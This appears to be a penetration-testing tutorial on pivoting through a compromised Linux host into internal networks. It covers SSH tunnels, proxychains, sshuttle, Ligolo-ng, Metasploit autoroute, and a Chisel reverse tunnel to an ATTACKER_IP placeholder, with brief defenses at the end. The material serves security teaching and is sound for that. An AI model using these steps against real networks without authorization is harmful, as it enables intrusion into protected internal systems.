# Introduction

Linux pivoting is the process of using a compromised Linux machine as a bridge to access internal networks and systems that are not directly reachable by the attacker.

During penetration tests, Linux servers are commonly exposed to the internet and can provide access to protected internal environments.

The objective:

```
Attacker Machine

↓

Compromised Linux Host

↓

Internal Network

↓

Additional Targets
```

---

# What is Linux Pivoting?

Pivoting allows attackers and penetration testers to route traffic through a compromised Linux system.

The compromised machine acts as a gateway.

Example:

```
Kali Linux

192.168.1.50


↓

Linux Server

10.10.10.5


↓

Internal Server

10.10.20.15
```

The attacker cannot directly access:

```
10.10.20.15
```

but can reach it through:

```
10.10.10.5
```

---

# Why Linux Pivoting Matters

Many networks contain isolated segments.

Example:

```
Internet

↓

Public Server

↓

Internal Application Network

↓

Database Network
```

A compromised Linux server may expose:

- Internal web applications
- Databases
- File servers
- Management interfaces
- Other vulnerable machines

# Linux Network Architecture

Linux systems can have multiple network interfaces.

Example:

```
eth0

192.168.1.20


eth1

10.10.20.5
```

The second interface provides access to an internal network.

# Identifying Linux Network Information

After obtaining a shell:

---

## Network Interfaces

Command:

```bash
ip addr
```

Example:

```
eth0

192.168.1.10


eth1

10.10.20.5
```

---

## Routing Information

Command:

```bash
ip route
```

Example:

```
10.10.20.0/24 dev eth1
```

This reveals accessible networks.

---

## ARP Table

Command:

```bash
arp -a
```

or:

```bash
ip neigh
```

Example:

```
10.10.20.15

10.10.20.20
```

# Discovering Internal Networks

After identifying network ranges, discover active hosts.

Example:

```
10.10.20.0/24
```

Scan:

```bash
nmap -sn 10.10.20.0/24
```

Results:

```
10.10.20.10

10.10.20.15

10.10.20.25
```

# SSH Tunneling

SSH is one of the most common Linux pivoting techniques.

SSH can create:

- Local tunnels
- Remote tunnels
- SOCKS proxies

---

# Local Port Forwarding

Local forwarding allows access to an internal service through the pivot.

Syntax:

```bash
ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT user@pivot
```

Example:

```bash
ssh -L 8080:10.10.20.15:80 user@10.10.10.5
```

Access:

```
localhost:8080
```

connects to:

```
10.10.20.15:80
```

---

# Remote Port Forwarding

Remote forwarding exposes a local service through the pivot.

Syntax:

```bash
ssh -R REMOTE_PORT:LOCAL_HOST:LOCAL_PORT user@pivot
```

Example:

```bash
ssh -R 9000:127.0.0.1:9000 user@pivot
```

Useful when the compromised host needs to reach the attacker.

---

# Dynamic SOCKS Proxy

SSH can create a SOCKS proxy.

Command:

```bash
ssh -D 9050 user@pivot
```

Creates:

```
SOCKS5 Proxy

127.0.0.1:9050
```

Traffic flow:

```
Tool

↓

SOCKS Proxy

↓

SSH Tunnel

↓

Internal Network
```

---

# Proxychains Configuration

Proxychains allows tools to use the SOCKS proxy.

Edit:

```bash
nano /etc/proxychains.conf
```

Add:

```
socks5 127.0.0.1 9050
```

Run:

```bash
proxychains nmap -sT 10.10.20.15
```

---

Applications:

- Nmap
- Browser
- Burp Suite
- Metasploit

---

# SSHuttle Pivoting

SSHuttle creates a VPN-like tunnel through SSH.

Example:

```bash
sshuttle -r user@pivot 10.10.20.0/24
```

Traffic:

```
Kali

↓

SSHuttle

↓

Pivot

↓

Internal Network
```

Advantages:

- Easy routing
- No proxy configuration
- Transparent access

---

# Chisel Pivoting

Chisel creates TCP tunnels over HTTP.

Server:

```bash
chisel server --reverse -p 8000
```

Client:

```bash
chisel client ATTACKER_IP:8000 R:socks
```

Creates:

```
SOCKS Proxy
```

---

# Ligolo-ng Pivoting

Ligolo-ng creates a network tunnel between attacker and compromised host.

Architecture:

```
Attacker Proxy

↓

Linux Agent

↓

Internal Network
```

Advantages:

- Simple routing
- High performance
- Easy internal access

---

# Metasploit Pivoting

Metasploit supports pivoting through sessions.

Start:

```bash
msfconsole
```

List sessions:

```text
sessions
```

Example:

```
1 meterpreter
```

---

Add route:

```text
run autoroute -s 10.10.20.0/24
```

Verify:

```text
route print
```

Now Metasploit modules can access the internal network.

# Defense & Mitigation

Protect against pivoting by:

- Segmenting networks
- Restricting SSH access
- Monitoring internal connections
- Using firewall rules
- Removing unnecessary services
- Detecting tunnels
- Applying least privilege
